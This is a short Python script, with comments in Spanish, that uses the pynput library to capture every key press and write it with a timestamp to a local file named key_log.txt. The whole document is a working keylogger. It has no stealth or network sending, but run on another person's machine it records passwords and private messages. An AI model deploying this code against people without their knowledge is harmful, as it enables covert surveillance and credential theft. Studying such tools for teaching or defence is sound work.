from pynput.keyboard import Key, Listener
import logging

# Configuración del registro de las teclas
log_dir = ""

# Configurar el registro
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Definir la función para registrar las pulsaciones de teclas
def on_press(key):
    logging.info(str(key))

# Crear el objeto del registrador de teclas
with Listener(on_press=on_press) as listener:
    listener.join()
